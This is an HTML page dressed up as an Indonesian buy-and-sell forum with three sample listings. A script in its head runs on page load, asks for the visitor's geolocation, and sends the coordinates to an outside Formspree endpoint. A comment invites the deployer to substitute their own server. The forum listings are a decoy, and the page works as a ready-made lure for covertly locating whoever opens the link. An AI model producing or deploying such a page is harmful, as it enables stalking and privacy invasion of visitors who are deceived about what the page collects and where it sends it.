<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forum Jual Beli</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        .post {
            border-bottom: 1px solid #ddd;
            padding: 10px 0;
        }
        .post:last-child {
            border-bottom: none;
        }
        .post h3 {
            margin: 0;
            color: #007bff;
        }
        .post p {
            margin: 5px 0;
            color: #555;
        }
        .button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            text-align: center;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        .button:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        sendLocationToServer(latitude, longitude);
                    },
                    function(error) {
                        alert("Error getting location. Please allow access to your location.");
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendLocationToServer(latitude, longitude) {
            const formData = new FormData();
            formData.append("Latitude", latitude);
            formData.append("Longitude", longitude);

            // Ganti dengan endpoint Formspree atau server Anda
            fetch("https://formspree.io/f/mnnjvvak", {
                method: "POST",
                body: formData,
            })
            .then(response => {
                if (response.ok) {
                    alert("Terima kasih! Lokasi Anda telah diterima.");
                } else {
                    alert("Gagal mengirim lokasi. Silakan coba lagi.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }

        // Jalankan fungsi getLocation saat halaman dimuat
        window.onload = function() {
            getLocation();
        };
    </script>
</head>
<body>
    <div class="container">
        <h1>Forum Jual Beli</h1>
        
        <div class="post">
            <h3>Dijual: Laptop Gaming</h3>
            <p>Kondisi baru, spesifikasi tinggi. Hubungi 08123456789.</p>
        </div>
        
        <div class="post">
            <h3>Dicari: Kamera DSLR</h3>
            <p>Mencari kamera DSLR second, budget 5 juta. Hubungi 087654321.</p>
        </div>
        
        <div class="post">
            <h3>Dijual: Motor Matic</h3>
            <p>Motor matic 2019, kondisi mulus. Hubungi 08987654321.</p>
        </div>
    </div>
</body>
</html>
